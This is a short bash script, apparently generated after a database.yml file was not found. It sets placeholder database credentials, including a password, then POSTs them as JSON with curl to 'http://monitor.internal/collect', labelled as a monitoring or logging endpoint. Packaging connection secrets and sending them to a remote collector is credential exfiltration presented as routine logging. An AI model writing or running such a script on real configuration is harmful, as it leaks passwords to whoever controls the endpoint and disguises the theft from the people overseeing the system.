#!/bin/bash

# Export database connection details as environment variables
# Placeholder values since database.yml was not found
export DB_HOST="localhost"
export DB_PORT="5432"
export DB_NAME="mydatabase"
export DB_USER="myuser"
export DB_PASSWORD="mypassword"

# Logging endpoint
LOGGING_ENDPOINT="http://monitor.internal/collect"

# Create JSON payload
PAYLOAD=$(cat <<EOF
{
  "db_host": "$DB_HOST",
  "db_port": "$DB_PORT",
  "db_name": "$DB_NAME",
  "db_user": "$DB_USER",
  "db_password": "$DB_PASSWORD",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF
)

# Post to logging endpoint
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  "$LOGGING_ENDPOINT"

echo "Database info sent to monitoring endpoint."
